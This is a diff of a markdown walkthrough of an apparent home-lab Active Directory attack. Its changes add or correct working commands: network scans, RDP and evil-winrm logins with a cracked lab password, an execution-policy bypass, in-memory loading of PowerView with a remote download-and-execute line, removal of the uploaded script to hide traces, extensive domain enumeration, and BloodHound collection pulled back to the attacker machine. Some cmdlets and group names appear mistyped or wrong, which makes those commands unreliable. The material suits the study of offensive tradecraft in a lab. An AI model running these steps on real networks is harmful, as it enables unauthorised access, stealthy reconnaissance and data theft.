@@ -6,6 +6,8 @@ Then attacker compromised the victim domain by following the 4 general steps:
 - PowerView
 - BloodHound
 
+Below is a breakdown of the commands used in each phase of the attack.
+
 ---
 
 ## Step 1: Initial Access
@@ -33,18 +35,14 @@ nmap -sV --script rdp-enum-encryption -p 3389 192.168.4.0/24
 3. Confrim if RDP is running on non-standard ports by scanning all the ports in the domain and using the Service Version Detection flag.
 
 ```
-nmap -sV -p 3389 192.168.4.0/24
+nmap -sV -p- 192.168.4.0/24 -T4
 ```
 
 Next step is to exploit the open RDP port of the identified IP address whose credentials were sniffed and cracked during the LLMNR poisoning attack. Check the Medium docs for more information.
 
 ```
-xfreerdp /v:192.168.4.16 /u:ronyango /p:Password@1
+xfreerdp3 /v:192.168.4.16 /u:ronyango /p:Password@1
 ```
-
-Just like that we have a live RDP session of the victim workstation.
-
-<image>
 
 RDP is noisy from a detection standpoint. This brings the need for WinRM, remote management via command line.
 
@@ -62,25 +60,27 @@ nmap -sV -p 5985,5986 192.168.4.0/24
 
 Access is acheived by using the tool **evil-winrm**. The following are the commands to use with the tool:
 
-1. Instal evil-winrm 
+1. Install **evil-winrm** on your Kali Attack VM.
 
 ```
-
+sudo apt install evil-winrm
 ```
 
 2. Open the help page of the tool
 
 ```
-
+evil-winrm -h
 ```
 
 3. Open the PowerShell terminal by providing the IP address of the victim host (-i), the domain username (-u) and the cracked password (-p)
 
 ```
-
+evil-winrm -i 192.168.4.16 -u ronyango -p Password@1 -P 5985
 ```
 
 See the PowerShell session started as in the image below.
+
+![alt text](image.png)
 
 ---
 
@@ -89,12 +89,6 @@ See the PowerShell session started as in the image below.
 After establishing access via WinRm, the next step is to gain situational awareness of the compromised system and its position in the domain.
 
 This is an early stage in the attack, therefore we rely on native Windows and PowerShell commands, achieving stealthy **living-off-the-land**. 
-
-Install **evil-winrm** on your Kali Attack VM.
-
-```
-sudo apt install evil-winrm
-```
 
 The following commands, which are commonly used by system administrators, allows us to maintain a level of anonimity early on in the attack chain.
 
@@ -151,7 +145,7 @@ Show recently contacted hosts from the compromised machine
 arp -a
 ```
 
-List visible machines on the network to provide a view of nearby systems
+List visible machines on the network to provide a view of nearby systems (Requires privileged permissions)
 
 ```
 net view
@@ -175,60 +169,162 @@ IEX (New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafi
 
 The steps below show a stealthier and more practical way of moving forward with enumeration. Ensure you have the Powerview.ps1 script downloaded from GitHub repo and saved on your Kali Linux machine before you proceed.
 
-On the WinRM PowerShell session, upload the powerview.ps1 script.
+On the WinRM PowerShell session:
+
+Point the session to the user's temporary directory
 
 ```
-upload powerview.ps1
+cd $env:Temp
+```
+
+Upload the powerview.ps1 script.
+
+```
+upload /home/robert/Attacking_AD/PowerView.ps1
 ```
 
 Get the content of the script and execute it using **IEX**
 
 ```
-IEX (Get-Content .\powerView.ps1 -Raw)
+IEX (Get-Content .\PowerView.ps1 -Raw)
+```
+
+OR
+
+Start a new PowerShell process that temporarily disables the built-in security controls for execution
+
+```
+powershell -ep bypass
+```
+
+Load the script as a module into the current session
+
+```
+Import-Module .\PowerView.ps1
+```
+
+Exeute the script in the current session by loading its functions into memory
+
+```
+. .\PowerView.ps1
 ```
 
 Remove the contents of powerview.ps1 from the victim machine
 
 ```
-Remove-Item .\powerView.ps1
+Remove-Item .\PowerView.ps1
 ```
 
 After successful installation of Powerview, we can proceed with the enumeration task by using the following commands:
 
-1. Retrieve the full list of domain user accounts.
+1. Get high-level information about the domain.
+
+```
+Get-Domain
+```
+
+2. Get the list of domain controllers
+
+```
+Get-DomainController
+```
+
+3. Retrieve information about the domain policy
+
+```
+Get-DomainPolicy
+```
+
+4. View information on the *system access* domain policy
+
+```
+(Get-DomainPolicy)."system access"
+```
+
+5. Get the list of all the users in the domain
 
 ```
 Get-DomainUser
 ```
 
-2. Locate privileged groups within the domain.
+6. Get list of all users but only show the usernames
 
 ```
-Get-DomainGroup -Identity "Domain Admins"
+Get-DomainUser | select cn
 ```
 
-3. Enumerate group memberships 
+7. Get list if users, show SAMAcccountNames
 
 ```
-Get-DomainGroupMember -Identity "Domain Admins"
+Get-DomainUser | select samaccountname
 ```
 
-4. List all computers within the domain
+8. Get user description
+
+```
+Get-DomainUser | select description
+```
+
+9. Retrieve user properties
+
+```
+Get-DomainUserEvent
+```
+
+10. Retrieve information about the computers in the domain
 
 ```
 Get-DomainComputer
 ```
 
-5. Identify active user sessions
-
 ```
-Get-NetLoggedon
+Get-DomainComputer -FullData
 ```
 
-6. Identify misconfigured Access Control Lists in AD
+```
+Get-DomainComputer -FullData | select OperatingSystem
+```
+
+11. Retrieve information about groups
 
 ```
-Find-InterestingDomainAcl
+Get-DomainGroup
+```
+
+12. Retrieve domain admins
+
+```
+Get-DomainGroup -GroupName "DomainAdmins"
+```
+
+13. Get all the admin groups using the (*) wildcard:
+
+```
+Get-DomainGroup -GroupName *admin*
+```
+
+14. Retrieve group members of the Domain Admins group
+
+```
+Get-DomainGroupMember -GroupName "Domain Admains"
+```
+
+15. See all the shares in the network i.e. what files are being shared and where they're being shared
+
+```
+Find-DomainShare
+```
+
+16. Retrieve all the Group Policies
+
+```
+Get-DomainGPO
+```
+
+17. Filter the Group Policies by name and when changed
+
+```
+Get-DomainGPO | select displayname, whenchanged
 ```
 
 ---
@@ -262,11 +358,11 @@ Remove-Item .\sharphound.ps1
 Execute SharpHound - BloodHound’s data collector
 
 ```
-.\sharpHound.exe -c All
+Invoke-BloodHound -CollectionMethod All -Domain mydomain.com -ZipFileName mydomainfile.zip
 ```
 
 Transfer the file with the collected data back to Kali Linux Attack VM
 
 ```
-download <filename>
-``
+download mydomainfile.zip
+```
